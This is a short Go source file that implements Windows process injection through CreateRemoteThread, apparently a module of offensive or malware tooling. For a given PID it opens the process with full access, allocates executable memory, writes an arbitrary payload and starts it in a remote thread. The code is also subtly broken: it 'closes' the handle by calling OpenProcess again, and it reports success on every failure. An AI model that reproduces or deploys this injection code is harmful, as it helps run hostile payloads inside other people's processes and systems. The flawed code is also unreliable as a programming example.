//go:build windows

package process_injection

import (
"golang.org/x/sys/windows"
"unsafe"
)

type CRTInjection struct{}

func NewCRTInjection() *CRTInjection {
return &CRTInjection{}
}

func (c *CRTInjection) Inject(pid int, payload []byte) error {
kernel32 := windows.NewLazyDLL("kernel32.dll")
procOpenProcess := kernel32.NewProc("OpenProcess")
procVirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
procWriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
procCreateRemoteThread := kernel32.NewProc("CreateRemoteThread")

handle, _, _ := procOpenProcess.Call(0x1F0FFF, 0, uintptr(pid))
if handle == 0 {
return nil
}
defer procOpenProcess.Call(handle)

addr, _, _ := procVirtualAllocEx.Call(handle, 0, uintptr(len(payload)), 0x3000, 0x40)
if addr == 0 {
return nil
}

var written uintptr
procWriteProcessMemory.Call(handle, addr, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)), uintptr(unsafe.Pointer(&written)))

procCreateRemoteThread.Call(handle, 0, 0, addr, 0, 0, 0)
return nil
}
